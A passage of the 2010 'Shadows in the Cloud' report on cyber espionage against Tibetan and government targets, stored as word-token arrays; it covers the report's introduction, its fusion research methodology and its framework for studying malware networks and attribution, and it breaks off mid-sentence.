["Part", "I", ":", "Background", "and", "Context", "\b", "1.1", "1.2", "1.3", "Introduction", "-", "Building", "upon", "GhostNet", "\b"], ["About", "the", "Shadows", "in", "the", "Cloud", "Investigation", "-", "Beyond", "GhostNet", "\b", "Research", "Framework", "\b", "Part", "II"], [":"], ["Methodology", "and", "Investigative", "Techniques\b", "2.1", "2.2", "2.3", "Methodology", "\b", "Field", "Investigation", "\b"], ["Technical", "Investigative", "Activities", "\b", "Part", "III", ":", "Mapping", "the", "Shadows", "in", "the", "Cloud", "\b"], ["3.1", "3.2", "."], ["3.3", "Analysis", "of", "Data", "while", "in", "the", "Field\b"], ["Technical", "Investigation\b"], ["Command", "and", "Control", "Infrastructure\b", "Part", "IV", ":", "Targets", "and", "Effects\b", "4.1", "4.2", "."], ["Compromised", "Victims", ":", "the", "evidence\b", "Victim", "Analysis", "on", "the", "basis", "of", "recovered", "documents\b"], ["Part", "V", ":"], ["Tackling", "Cyber", "Espionage\b", "5.1", "5.3", "Attribution", "and", "cyber", "crime", "/", "cyber", "espionage\b", "Notification\b", "p.", "1"], ["p.", "2"], ["p.", "4"], ["p.", "5", "p.", "7"], ["p.", "8"], ["p.", "8"], ["p.", "10"], ["p.", "12"], ["p.", "14"], ["p.", "16"], ["p.", "20"], ["p.", "25"], ["p.", "26"], ["p.", "30"], ["p.", "36"], ["p.", "37"], ["p.", "40"], ["Part", "VI", ":", "Conclusions\b"], ["p.", "42", "Bibliography", "and", "Suggested", "Readings\b"], ["p.", "45"], ["Glossary\b"], ["p.", "51", "PART", "1", ":", "Background", "and", "Context", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "1", ":", "BACKGROUND", "&", "CONTEXT", "1.1", "2"], ["Introduction", "-", "Building", "upon", "GhostNet", "Research", "into", "computer", "network", "exploitation", ",", "cyber", "espionage", ",", "malware", "and", "botnets", "has", "expanded", "in", "recent", "years", "from", "a", "relatively", "small", "cottage", "industry", "involving", "primarily", "technical", "experts", "to", "a", "major", "global", "phenomenon", "which", "now", "includes", "academia", ",", "defence", ",", "intelligence", ",", "law", "enforcement", ",", "and", "the", "private", "sector", "."], ["The", "rapid", "rise", "of"], ["this", "industry", "is", "in", "part", "a", "recognition", "of", "the", "significant", "threat", "that", "these", "global", "criminal", "ecosystems", "represent", "to", "critical", "infrastructure", ",", "government", "systems", ",", "personal", "privacy", ",", "commerce", ",", "and", "defense", "."], ["Several", "high", "profile", "cases", "and", "events", ",", "including", "the", "attacks", "on", "Google", "and", "other", "American", "companies", "in", "December", "2009", ",", "underscore", "the", "growing", "threat", "environment", "and", "suggest", "that", "these", "attacks", "are", "becoming", "the", "norm", "rather", "than", "an", "exception", "."], ["Policymakers", "are", "responding", "with", "legislation", ",", "institutional", "reforms", "and", "new", "initiatives", ",", "and", "an", "already", "sizable", "market", "for", "cyber", "security", "services", "is", "mushrooming", "into", "a", "multi", "-", "billion", "dollar", "global", "industry", "."], ["This", "report", "aims", "to", "contribute", "to", "research", "and", "debate", "in", "this", "domain", "."], ["Its", "release", "is", "strategic", ",", "coming", "roughly", "one", "year", "after", "the", "publication", "of", "Tracking", "GhostNet", "(", "See", "Box", "1", ",", "below", ")", "."], ["Box", "1", "."], ["Tracking", "GhostNet", ":"], ["Lessons", "Learned", "Tracking", "Ghostnet", ":"], ["Investigating", "a", "Cyber", "Espionage", "Network", "was", "the", "product", "of", "a", "ten", "-", "month", "investigation", "and", "analysis", "focused", "on", "allegations", "of", "Chinese", "cyber", "espionage", "against", "the", "Tibetan", "community", "."], ["The", "research", "entailed", "field", "-", "based", "investigations", "in", "India", ",", "Europe", "and", "North", "America", "working", "directly", "with", "affected", "Tibetan", "organizations", ",", "including", "the", "Private", "Office", "of", "the", "Dalai", "Lama", ",", "the", "Tibetan", "Government", "-", "in", "-", "Exile", ",", "and", "several", "Tibetan", "NGOs", "in", "Europe", "and", "North", "America", "."], ["The", "fieldwork", "generated", "extensive", "data", "that", "allowed", "us", "to", "examine", "Tibetan", "information", "security", "practices", ",", "as", "well", "as", "capture", "evidence", "of", "malware", "that", "had", "penetrated", "Tibetan", "computer", "systems", "."], ["We", "also", "engaged", "in", "extensive", "data", "analysis", "and", "technical", "investigation", "of", "web", "-", "based", "interfaces", "to", "command", "and", "control", "servers", "that", "were", "used", "by", "attackers", "to", "send", "instructions", "to", ",", "and", "receive", "data", "from", "compromised", "computers", "."], ["The", "report", "documented", "a", "wide", "ranging", "network", "of", "compromised", "computers", ",", "including", "at", "least", "1,295", "spread", "across", "103", "countries", ",", "30", "percent", "of", "which", "we", "identified", "and", "determined", "to", "be", "\u201c", "high", "-", "value", "\u201d", "targets", ",", "including", "ministries", "of", "foreign", "affairs", ",", "embassies", ",", "international", "organizations", ",", "news", "organizations", ",", "and", "a", "computer", "located", "at", "NATO", "headquarters", "."], ["Although", "there", "was", "circumstantial", "evidence", "pointing", "to", "elements", "within", "the", "People", "\u2019s", "Republic", "of"], ["China", ",", "our", "investigation", "concluded", "that", "there", "was", "not", "enough", "evidence", "to", "implicate", "the", "Chinese", "government", "itself", "and", "attribution", "behind", "GhostNet", "remains", "a", "mystery", "."], ["The", "report", "\u2019s", "aftermath", "was", "a", "learning", "experience", "."], ["The", "data", "that", "had", "been", "collected", "during", "the", "GhostNet", "investigation", "included", "sensitive", "information", "about", "compromised", "computers", "in", "over", "a", "hundred", "countries", "."], ["Many", "of", "the", "victims", "were", "understandably", "concerned", "about", "which", "of", "their", "computers", "were", "targeted", "and", "compromised", ",", "and", "came", "to", "us", "for", "information", "."], ["On", "our", "side", ",", "we", "felt", "unsure", "about", "the", "protocol", "around", "information", "sharing", ",", "and", "were", "in", "an", "awkward", "position", "to", "be", "able", "to", "give", "information", "over", "to", "governments", "and", "affected", "parties", "directly", "without", "being", "entirely", "clear", "about", "whom", "would", "be", "responsible", "and", "whether", "or", "not", "our", "interlocutors", "were", "appropriate", "authorities", "."], ["The", "notification", "problems", "around", "Ghostnet", "informed", "our", "approach", "to", "the", "Shadows", "in", "the", "Cloud", "investigation", ",", "including", "being", "more", "conscious", "from", "the", "outset", "of", "documenting", "our", "notification", "procedures", "."], ["The", "title", "of", "the", "report", "\u00ad", "\u2014", "Shadows", "in", "the", "Cloud", ":", "An", "Investigation", "into", "Cyber", "Espionage", "2.0", "\u2014", "is", "suggestive", "of", "several", "threads", "that", "wind", "their", "way", "through", "the", "investigation", "."], ["First", ",", "the", "malware", "networks", "we", "document", "and", "analyze", "are", "to", "a", "large", "degree", "organized", "and", "operated", "through", "the", "misuse", "of", "social", "networking", "and", "cloud", "computing", "platforms", ",", "including", "Google", ",", "Baidu", ",", "Yahoo", "!", ",", "and", "Twitter", ",", "in", "addition", "to", "traditional", "command", "and", "control", "servers", "."], ["Second", ",", "although", "we", "are", "able", "to", "piece", "together", "circumstantial", "evidence", "that", "provides", "the", "location", "and", "possible", "associations", "of", "the", "attackers", ",", "their", "actual", "identities", "and", "motivations", "remain", "illusory", "."], ["We", "catch", "a", "glimpse", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "1", ":", "BACKGROUND", "&", "CONTEXT", "3", "of", "a", "shadow", "of", "attribution", "in", "the", "cloud", ",", "in", "other", "words", ",", "but", "have", "no", "positive", "identification", "."], ["The", "2.0", "designation", "also", "contains", "a", "double", "entendre", ":", "it", "refers", "to", "a", "generational", "shift", "we", "believe", "is", "unfolding", "in", "malware", "networks", "in", "multiple", "dimensions", ",", "from", "what", "were", "once", "primarily", "simple", "to", "increasingly", "complex", ",", "adaptive", "systems", "spread", "across", "redundant", "services", "and", "platforms", ",", "and", "from", "criminal", "and", "industrial", "-", "based", "exploitation", "to", "political", ",", "military", ",", "and", "intelligence", "-", "focused", "espionage", "."], ["The", "2.0", "reference", "is", "also", "meant", "to", "note", "how", "the", "Shadow", "investigation", "is", "both", "a", "re", "-", "engagement", "with", ",", "but", "also", "a", "departure", "from", ",", "its", "predecessor", ":", "the", "Tracking", "GhostNet", "investigation", "."], ["This", "report", "is", "a", "continuation", "of", "Tracking", "GhostNet", ",", "but", "also", "represents", "a", "significantly", "new", "investigation", "yielding", "different", "and", "more", "nuanced", "evidence", "and", "analysis", "of", "the", "evolving", "cybercrime", "and", "cyber", "espionage", "environment", "."], ["As", "with", "GhostNet", ",", "we", "are", "interested", "in", "better", "understanding", "the", "evolving", "nature", "and", "complex", "ecosystem", "of", "today", "\u2019s", "malware", "networks", "and", "see", "this", "investigation", "as", "helping", "to", "build", "a", "knowledge", "base", "around", "cyber", "security", "research", "."], ["In", "this", "respect", ",", "Shadows", "in", "the", "Cloud", "is", "very", "much", "a", "work", "-", "in", "-", "progress", ",", "insofar", "as", "we", "began", "this", "investigation", "by", "picking", "up", "several", "threads", "that", "were", "left", "open", "-", "ended", "or", "unanswered", "in", "the", "original", "GhostNet", "investigation", ",", "and", "expect", "to", "continue", "to", "examine", "threads", "that", "are", "left", "hanging", "in", "this", "report", "."], ["The", "aim", "of", "this", "present", "investigation", "is", "to", "further", "refine", "the", "methodologies", "used", "to", "investigate", "and", "analyze", "malware", "networks", "through", "a", "fusion", "methodology", ",", "which", "combines", "network", "-", "based", "technical", "interrogation", ",", "data", "analysis", "and", "visualization", ",", "and", "field", "-", "based", "contextual", "investigations", "(", "See", "Box", "2", ",", "below", ")", "."], ["The", "combination", "of", "methods", "from", "different", "disciplines", "is", "a", "critical", "and", "common", "feature", "of", "both", "the", "GhostNet", "and", "Shadow", "investigations", "and", "analyses", "."], ["Network", "-", "based", "technical", "interrogation", ",", "open", "source", "data", "mining", "and", "analysis", "(", "using", "tools", "such", "as", "Google", ")", ",", "key", "informant", "interviews", "and", "field", "-", "based", "investigations", "on", "their", "own", "can", "accomplish", "a", "great", "deal", ",", "but", "it", "is", "through", "their", "fusion", "that", "a", "more", "comprehensive", "and", "nuanced", "understanding", "can", "be", "achieved", "."], ["Box", "2", "."], ["Operationalizing", "the", "Fusion", "Methodology"], ["Over", "the", "past", "decade", "we", "have", "been", "developing", "a", "fusion", "methodology", "for", "investigating", "the", "exercise", "of", "political", "power", "in", "cyberspace", "."], ["This", "approach", "combines", "quantitative", ",", "qualitative", "and", "technical", "data", ",", "and", "draws", "on", "multidisciplinary", "analysis", "techniques", "to", "derive", "results", "."], ["In", "our", "field", "investigations", ",", "we", "conduct", "research", "among", "affected", "target", "audiences", "and", "employ", "techniques", "that", "include", "interviews", ",", "long", "-", "term", "in", "situ", "interaction", "with", "our", "partners", ",", "and", "technical", "data", "collection", "involving", "system", "monitoring", ",", "network", "reconnaissance", ",", "and", "interrogation", "."], ["Data", "and", "in", "situ", "analysis", "from", "field", "investigations", "are", "then", "taken", "to", "the", "lab", "where", "they", "are", "analysed", "using", "a", "variety", "of", "data", "fusion", "and", "visualization", "methods", ",", "based", "around", "the", "Palantir", "data", "fusion", "system", "."], ["Leads", "developed", "on", "the", "basis", "of", "in", "-", "field", "activities", "are", "pursued", "through", "technical", "investigations", "and", "the", "resulting", "data", "and", "analysis", "outputs", "are", "shared", "with", "our", "in", "-", "field", "teams", "and", "partners", "for", "verification", "and", "for", "generating", "additional", "entry", "points", "for", "follow", "-", "on", "field", "investigations", "."], ["We", "then", "interpret", "results", "from", "these", "investigations", "through", "a", "variety", "of", "theoretical", "lenses", "drawing", "from", "disciplines", "of", "political", "science", ",", "international", "relations", ",", "sociology", ",", "risk", "analysis", ",", "and", "criminology", "(", "among", "others", ")", "."], ["We", "believe", "that", "through", "this", "mixed", "methods", "interdisciplinary", "approach", "we", "are", "able", "to", "develop", "a", "richer", "understanding", "than", "would", "be", "possible", "from", "studies", "that", "focus", "solely", "on", "technical", "analysis", "or", "that", "primarily", "consist", "of", "legal", ",", "policy", "or", "theoretical", "investigations", "."], ["The", "Shadow", "investigation", "began", "as", "a", "follow", "-", "up", "of", "unexplored", "paths", "discovered", "during", "the", "GhostNet", "investigation", "."], ["It", "started", "in", "the", "offices", "of", "Tibetan", "organizations", "who", "suspected", "they", "were", "targets", "of", "cyber", "espionage", ",", "and", "broadened", "to", "include", "a", "much", "wider", "list", "of", "victims", "."], ["The", "investigation", "used", "a", "number", "of", "techniques", ",", "including", "a", "DNS", "sinkhole", "we", "established", "by", "registering", "domains", "that", "had", "previously", "been", "used", "by", "the", "attackers", "targeting", "Tibetan", "institutions", ",", "such", "as", "a", "computer", "system", "at", "the", "offices", "of", "the", "Dalai", "Lama", "."], ["This", "reinforces", "our", "view", "that", "the", "combination", "of", "technical", "analysis", "and", "field", "investigation", "forms", "a", "fruitful", "starting", "point", "of", "inquiry", "that", "ultimately", "leads", "to", "important", "insights", "into", "the", "attackers", "\u2019", "capabilities", ",", "the", "ability", "to", "investigate", "a", "much", "wider", "domain", "of", "infected", "targets", ",", "and", "a", "contextual", "understanding", "of", "the", "attackers", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "1", ":", "BACKGROUND", "&", "CONTEXT", "4", "As", "was", "the", "case", "with", "GhostNet", ",", "dozens", "of", "high", "-", "level", "government", "networks", ",", "embassies", ",", "international", "organizations", "and", "others", "have", "been", "penetrated", ",", "and", "confidential", ",", "sensitive", ",", "and", "private", "documents", "stolen", "."], ["The", "Shadows", "report", "underscores", "the", "interconnected", "and", "complex", "challenges", "of", "cyber", "security", "."], ["In", "particular", ",", "it", "points", "to", "the", "possibility", "of", "a", "perfect", "storm", "that", "may", "result", "from", "a", "lack", "of", "international", "consensus", ",", "ill", "-", "developed", "and", "implemented", "security", "practices", ",", "a", "paucity", "of", "notification", "mechanisms", ",", "and", "the", "growing", "confluence", "of", "cyber", "crime", ",", "traditional", "espionage", ",", "and", "the", "militarization", "of", "cyberspace", "."], ["1.2", "About", "the", "Shadows", "in", "the", "Cloud", "Investigation", ":", "Beyond", "GhostNet"], ["The", "Tracking", "GhostNet", "report", "revealed", "a", "small", "piece", "of", "the", "underground", "cyber", "espionage", "world", "."], ["After", "the", "report", "was", "published", ",", "several", "of", "the", "command", "and", "control", "servers", "listed", "in", "the", "report", "and", "part", "of", "the", "network", "went", "offline", "."], ["However", ",", "targeted", "cyber", "attacks", "against", "Tibetan", "interests", "and", "various", "governments", "did", "not", "suddenly", "cease", "."], ["The", "Shadowserver", "Foundation", "had", "also", "been", "looking", "into", "several", "similar", "cyber", "attacks", "both", "prior", "to", "and", "after", "the", "GhostNet", "report", "was", "published", "."], ["Approximately", "six", "months", "after", "the", "report", "\u2019s", "publication", ",", "the", "Shadowserver", "Foundation", "and", "the", "Information", "Warfare", "Monitor", "began", "a", "collaborative", "effort", "to", "further", "investigate", "new", "and", "related", "attacks", ",", "as", "well", "as", "any", "remaining", "parts", "of", "GhostNet", "."], ["Shadows", "in", "the", "Cloud", "thus", "departs", "from", "Tracking", "GhostNet", "in", "several", "ways", "."], ["Research", "on", "cyber", "security", "is", "rapidly", "developing", ",", "and", "several", "groups", "with", "widely", "differing", "skill", "sets", "and", "experience", "are", "working", "on", "related", "areas", "."], ["Information", "sharing", ",", "generally", "speaking", ",", "is", "immature", "and", "underdeveloped", ",", "often", "hampered", "by", "proprietary", "concerns", "surrounding", "the", "commercial", "market", "for", "cyber", "security", "services", "."], ["Progress", "on", "research", "in", "this", "area", "will", "only", "stand", "to", "benefit", "from", "greater", "dialogue", "and", "information", "sharing", "among", "security", "researchers", "."], ["Shadows", "in", "the"], ["Cloud", "was", "thus", "undertaken", "jointly", "by", "the", "Information", "Warfare", "Monitor", ",", "which", "itself", "is", "a", "collaborative", "engagement", "between", "a", "public", "and", "private", "institution", ",", "and", "the", "Shadowserver", "Foundation", ",", "which", "is", "an", "all", "-", "volunteer", "watchdog", "group", "of", "security", "professionals", "who", "gather", ",", "track", "and", "report", "on", "malware", ",", "botnet", "activity", ",", "and", "electronic", "fraud", "."], ["The", "Information", "Warfare", "Monitor", "and", "the", "Shadowserver", "Foundation", "have", "several", "complementary", "resources", "and", "data", "sets", "."], ["Combining", "efforts", "in", "this", "way", "contributed", "to", "a", "much", "greater", "pool", "of", "knowledge", "and", "expertise", "from", "which", "to", "draw", "strategic", "choices", "along", "each", "step", "of", "the", "investigation", ",", "and", "for", "overall", "analysis", "."], ["Lastly", ",", "the", "information", "sharing", "that", "went", "into", "Shadows", "in", "the", "Cloud", "extended", "to", "the", "Office", "of", "His", "Holiness", "the", "Dalai", "Lama", "(", "OHHDL", ")", ",", "the", "Tibetan", "Government", "in", "Exile", "(", "TGIE", ")", "and", "Tibetan", "non", "-", "governmental", "organizations", "."], ["Information", "sharing", "among", "victims", "of", "network", "intrusions", "and", "espionage", "is", "rare", "."], ["The", "Tibetan", "organizations", "were", "willing", "to", "provide", "access", "and", "share", "information", "with", "our", "investigation", "that", "proved", "to", "be", "invaluable", "."], ["Shadows", "in", "the", "Cloud", "is", "also", "distinct", "from", "Tracking", "GhostNet", "in", "terms", "of", "the", "type", "of", "data", "unearthed", "during", "the", "course", "of", "the", "investigation", "."], ["With", "GhostNet", ",", "while", "we", "were", "able", "to", "monitor", "the", "exfiltration", "of", "sensitive", "documents", "from", "computers", "to", "which", "we", "had", "field", "access", ",", "we", "were", "unable", "to", "otherwise", "determine", "which", "documents", "were", "stolen", "from", "victims", "that", "we", "had", "identified", ",", "and", "thus", "could", "only", "infer", "intentionality", "on", "the", "part", "of", "the", "attackers", "."], ["In", "Shadows", ",", "we", "were", "able", "to", "recover", "a", "significant", "volume", "of", "stolen", "documents", ",", "some", "of", "which", "are", "highly", "sensitive", ",", "from", "a", "drop", "zone", "connected", "to", "one", "of", "the", "malware", "networks", "under", "observation", "."], ["Although", "not", "unprecedented", "among", "cyber", "security", "research", ",", "access", "to", "stolen", "documents", "such", "as", "those", "which", "are", "analysed", "here", "offers", "a", "unique", "but", "partial", "insight", "into", "the", "type", "of", "information", "that", "can", "be", "leaked", "out", "of", "compromised", "computers", "."], ["It", "may", "even", "help", "answer", "some", "lingering", "questions", "about", "the", "intentionality", "and", "attribution", "of", "the", "attackers", ",", "although", "that", "is", "not", "clear", "by", "any", "means", "."], ["We", "pick", "up", "both", "of", "these", "threads", "in", "detail", "in", "our", "report", "below", "."], ["JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "1", ":", "BACKGROUND", "&", "CONTEXT", "1.3", "5", "Research", "Framework"], ["Although", "the", "research", "that", "we", "engage", "in", "is", "investigatory", ",", "it", "is", "not", "simply", "a", "report", "of", "the", "facts", "per", "se", "."], ["Our", "aim", "is", "to", "engage", "the", "cyber", "security", "research", "community", "by", "building", "upon", "prior", "research", "in", "a", "structured", ",", "focused", "manner", "through", "a", "systematic", "research", "framework", "."], ["Several", "overarching", "research", "questions", "structure", "the", "Shadow", "investigation", "and", "our", "analysis", "."], ["We", "outline", "these", "here", ",", "and", "pick", "up", "on", "them", "throughout", "our", "report", "."], ["Observation", "and", "Characterization", "of", "the", "Ecosystem", "of", "Malware"], ["One", "of", "the", "aims", "of", "cyber", "security", "research", "is", "to", "observe", "and", "characterize", "the", "evolving", "nature", "and", "complex", "ecosystem", "of", "today", "\u2019s", "malware", ",", "botnets", ",", "cyber", "espionage", "and", "cyber", "crime", "networks", "."], ["This", "is", "not", "a", "simple", "task", ",", "as", "the", "ecosystem", "of", "malware", "is", "very", "much", "like", "a", "complex", "adaptive", "system", ",", "only", "one", "that", "is", "dispersed", "across", "multiple", "ecosystems", ",", "operated", "by", "clandestine", "actors", "with", "potential", "criminal", "and/or", "espionage", "motivations", "who", "have", "shown", "a", "propensity", "to", "adapt", "their", "techniques", "to", "new", "software", "tools", ",", "social", "networking", "platforms", "and", "other", "technologies", "."], ["Crimeware", "networks", ",", "which", "to", "some", "extent", "are", "the", "oldest", "and", "most", "widespread", "malware", "networks", ",", "target", "generalized", "population", "sets", "in", "a", "mostly", "undiscriminating", "fashion", "."], ["Alongside", "crimeware", "networks"], [",", "however", ",", "there", "are", "other", "networks", "that", "are", "more", "discriminating", ",", "often", "characterized", "by", "the", "use", "of", "custom", "-", "made", "software", "attacks", ",", "and", "which", "seek", "to", "exploit", "and", "infiltrate", "not", "random", "pools", "of", "victims", "but", "rather", "deliberately", "selected", "targets", "."], ["Within", "each", "of", "these", "two", "major", "types", "of", "malware", "networks", "are", "likely", "many", "sub", "-", "types", ",", "including", "networks", "that", "specialize", "in", "distributed", "denial", "of", "service", "(", "DDoS", ")", "attacks", "."], ["Confusing", "matters", "further", "is", "that", "toolkits", "and", "techniques", "used", "in", "one", "instance", "are", "borrowed", "from", "another", ",", "making", "classification", "difficult", "and", "increasingly", "questionable", "."], ["Being", "able", "to", "map", "the", "ecosystem", "of", "malware", ",", "however", ",", "is", "critical", "for", "research", ",", "policy", "and", "operational", "matters", ",", "and", "so", "is", "one", "of", "the", "primary", "aims", "of", "our", "research", "in", "Shadows", "in", "the", "Cloud", "(", "Adair", "2010", ")", "."], ["From", "Criminal", "Exploitation", "to", "Political", "Espionage", "?"], ["Cyber", "crime", "is", "as", "old", "as", "cyberspace", "itself", ",", "and", "criminal", "networks", ",", "as", "alluded", "to", "above", ",", "are", "longstanding", "characteristics", "of", "the", "dark", "side", "of", "the", "Internet", "."], ["What", "is", "more", "novel", "is", "the", "use", "of", "criminal", "exploitation", "kits", ",", "techniques", "and", "networks", "for", "purposes", "of", "political", "espionage", "(", "Villeneuve", "2010", ")", "."], ["Debates", "about", "whether", "or", "not", "governments", "are", "actively", "involved", "in", "cyber", "espionage", "and", "computer", "network", "exploitation", ",", "either", "through", "agencies", "they", "control", "directly", "or", "through", "some", "kind", "of", "privateering", ",", "now", "dominate", "the", "headlines", "and", "have", "become", "part", "of", "a", "growing", "politicization", "of", "the", "cyber", "security", "arena", "."], ["One", "of", "the", "aims", "of", "our", "research", "is", "to", "discern", "to", "what", "extent"], ["we", "can", "impute", "motivations", "behind", "the", "attacks", "we", "document", ",", "to", "help", "understand", "whether", "in", "fact", "the", "networks", "under", "our", "observation", "are", "part", "of", "a", "criminal", "network", ",", "a", "political", "espionage", "network", ",", "an", "industrial", "espionage", "network", ",", "an", "opportunistic", "network", ",", "or", "some", "combination", "of", "these", "."], ["Such", "questions", ",", "it", "should", "be", "pointed", "out", ",", "are", "entirely", "distinct", "(", "though", "not", "unrelated", ")", "to", "the", "question", "of", "attribution", "(", "i.e.", ",", "who", "is", "responsible", "?", ")", "."], ["We", "hypothesize", "that", "political", "espionage", "networks", "may", "be", "deliberately", "exploiting", "criminal", "kits", ",", "techniques", "and", "networks", "both", "to", "distance", "themselves", "from", "attribution", "and", "strategically", "cultivate", "a", "climate", "of", "uncertainty", "."], ["To", "answer", "these", "questions", "requires", "a", "high", "degree", "of", "nuance", ",", "as", "the", "information", "we", "have", "been", "able", "to", "obtain", "is", "incomplete", ",", "and", "so", "a", "great", "deal", "of", "our", "analysis", "rests", "on", "inferences", "made", "on", "the", "basis", "of", "multiple", "data", "sources", "and", "our", "fusion", "methodology", "(", "See", "Box", "2", ",", "page", "3", ")", "."], ["Collateral", "Compromise", "Organizations", "from", "around", "the", "world", "have", "moved", "swiftly", "to", "adopt", "new", "information", "and", "communication", "technologies", ",", "and", "have", "become", "part", "of", "electronically", "linked", "communities", "in", "the", "commercial", ",", "government", ",", "and", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "1", ":", "BACKGROUND", "&", "CONTEXT", "6", "military", "sectors", "."], ["They", "exchange", "information", "as", "a", "matter", "of", "routine", ",", "across", "social", "networking", "and", "cloud", "computing", "platforms", ",", "using", "flash", "drives", "and", "other", "portable", "devices", ",", "and", "thus", "become", "co", "-", "dependent", "on", "each", "others", "\u2019", "information", "and", "computer", "and", "network", "security", "practices", "."], ["The", "vulnerabilities", "of", "one", "actor", "can", "quickly", "and", "unintentionally", "compromise", "unwitting", "third", "parties", ",", "which", "in", "turn", "can", "become", "the", "basis", "for", "actionable", "intelligence", "against", "those", "third", "parties", "."], ["We", "hypothesize", "that", "there", "is", "a", "high", "probability", "for", "collateral", "compromise", "in", "any", "malware", "network", "because", "of", "this", "mutual", "dependence", "."], ["A", "key", "consideration", ",", "of", "course", ",", "is", "how", "to", "discern", "intended", "from", "unintended", "victims", ",", "a", "problem", "that", "is", "difficult", "to", "solve", "."], ["Actionable", "Intelligence", "around", "Exfiltrated", "Data"], ["Related", "to", "collateral", "compromise", "is", "the", "issue", "of", "the", "strategic", "value", "of", "exfiltrated", "data", "."], ["Access", "to", "this", "data", "can", "offer", "important", "clues", "about", "the", "motivation", "and", "attribution", "of", "the", "attackers", "."], ["It", "can", "also", "provide", "insight", "about", "the", "strategic", "value", "of", "the", "type", "of", "data", "that", "can", "be", "accessed", "through", "malware", "networks", "."], ["In", "the", "course", "of", "our", "investigation", ",", "we", "assumed", "that", "we", "would", "get", ",", "at", "best", ",", "only", "a", "partial", "picture", "of", "the", "exfiltrated", "data", ",", "but", "even", "that", "partial", "picture", "would", "provide", "some", "potentially", "meaningful", "information", "for", "those", "who", "acquire", "it", "."], ["While", "each", "individual", "data", "point", "may", "be", "of", "little", "value", ",", "when", "combined", "with", "other", "data", "acquired", "through", "other", "means", "(", "e.g.", ",", "open", "source", "searching", ")", "a", "very", "detailed", "operational", "picture", "can", "be", "assembled", "."], ["We", "try", "to", "assess", "and", "evaluate", "the", "exfiltrated", "data", "we", "were", "able", "to", "access", "with", "these", "issues", "in", "mind", "."], ["Attribution"], ["Examining", "attribution", "is", "an", "arduous", "but", "important", "component", "of", "any", "cyber", "security", "investigation", "and", "has", "become", "a", "major", "political", "issue", "at", "the", "highest", "levels", "around", "several", "recent", "cyber", "attacks", "."], ["In", "order", "to", "characterise", "the", "attackers", ",", "a", "variety", "of", "technical", "indicators", "as", "well", "as", "behavioural", "indicators", "need", "to", "be", "analysed", "("], ["Parker", "et", "al", "."], ["2004", ";", "Parker", "et", "al", "."], ["2003", ")", "."], ["These", "characteristics", "are", "interpreted", "in", "the", "context", "of", "the", "nature", "of", "the", "targets", "and", "the", "objective", "of", "the", "attack", "."], ["The", "nature", "and", "timing", "of", "the", "attack", ",", "the", "exploit", ",", "the", "malware", ",", "and", "the", "command", "and", "control", "infrastructure", ",", "are", "just", "some", "of", "the", "components", "that", "go", "into", "determining", "attribution", "."], ["Knowing", "the", "methods", "and", "behaviour", "of", "the", "attackers", "as", "well", "as", "the", "character", "of", "the", "tools", "the", "attackers", "use", "once", "inside", "the", "target", "\u2019s", "network", ",", "the", "data", "that", "the", "attackers", "exfiltrate", "and", "where", "that", "data", "goes", ",", "are", "also", "crucial", "parts", "of", "the", "overall", "assessment", "(", "Bejtlich", "2010", ";", "Cloppert", "2009", ";", "Mandiant", "2010", ")", "."], ["Moreover", ",", "historical", "information", "and", "ongoing", "intelligence", "collection", "are", "crucial", "when", "trying", "to", "understand", "the", "scope", "of", "the", "threat", "(", "Deloitte", "&", "Touche", "LLP", ",", "2010", ")", "."], ["It", "is", "difficult", "to", "assess", "attribution", "when", "examining", "an", "isolated", "attack", ";", "it", "is", "the", "broader", "patterns", ",", "connections", "and", "contextual", "information", "that", "inform", "the", "process", "."], ["However", ",", "it", "is", "uncommon", "to", "have", "a", "complete", "data", "set", "covering", "all", "aspects", "of", "the", "attackers", "\u2019", "operations", "."], ["Some", "may", "have", "access", "to", "data", "regarding", "the", "attackers", "\u2019", "activities", "once", "inside", "a", "particular", "network", "."], ["Others", "may", "have", "extensive", "collections", "of", "malware", "samples", "and", "historical", "data", "on", "command", "and", "control", "infrastructure", "."], ["Others", "may", "have", "information", "on", "how", "the", "attackers", "use", "various", "exploits", ",", "or", "craft", "targeted", "spear", "phishing", "emails", "and", "other", "methods", "focused", "on", "compromising", "particular", "targets", "."], ["Others", "may", "have", "data", "retrieved", "from", "the", "attackers", "that", "indicate", "the", "identity", "of", "those", "who", "have", "been", "compromised", "."], ["And", "finally", "still", "others", "may", "have", "the", "necessary", "geopolitical", "knowledge", "to", "interpret", "the", "attacks", "within", "a", "broader", "context", "."], ["Often", ",", "investigations", "do", "not", "have", "the", "luxury", "of", "such", "a", "full", "data", "set", "and", "must", "rely", "on", "incomplete", "information", "and", "partial", "observations", "."], ["Further", "complicating", "matters", "is", "that", "any", "of", "this", "information", "is", "often", "dependent", "on", "mistakes", "made", "by", "the", "attackers", ",", "which", "typically", "lead", "to", "slices", "of", "an", "overall", "network", "instead", "of", "a", "comprehensive", "view", "."], ["Any", "questions", "concerning", "attribution", "must", "therefore", "always", "be", "set", "against", "a", "context", "of", "a", "complete", "consideration", "of", "alternative", "explanations", "and", "qualified", "observations", "."], ["PART", "2", ":"], ["Methodology", "and", "Investigative", "Techniques", "JR03", "-", "2010", "Shadows", "in", "the", "Cloud", "-", "PART", "2", ":", "METHODOLOGY", "&", "INVESTIGATIVE", "TECHNIQUES", "2.1", "8", "Methodology"], ["The", "core", "of", "the", "methodology", "employed", "in", "the", "Shadows", "in", "the", "Cloud", "investigation", "rests", "at", "the", "nexus", "of", "technical", "interrogation", ",", "field", "investigation", ",", "data", "analysis", ",", "and", "geopolitical", ",", "contextual", "research", "(", "See", "Box", "2", ",", "page", "3", ")", "."], ["No", "one", "method", "alone", "is", "capable", "of", "providing", "a", "comprehensive", "understanding", "of", "malware", "networks", ";", "it", "is", "through", "their", "combination", "that", "a", "complete", "picture", "is", "derived", "."], ["For", "example", ",", "a", "technical", "analysis", "of", "exploits", "and", "malware", "used", "by", "attackers", "alone", "can", "provide", "a", "great", "deal", "of", "insight", "into", "capabilities", "and", "targets", "."], ["The", "command", "and", "control", "servers", "used", "by", "the", "malware", "can", "be", "enumerated", ",", "and", "can", "sometimes", "reveal", "additional", "information", "that", "can", "be", "used", "to", "identify", "those", "who", "have", "been", "compromised", "and", "data", "that", "may", "have", "been", "exfiltrated", "from", "these", "targets", "."], ["However", ",", "the", "technical", "analysis", "of", "exploits", "and", "malware", 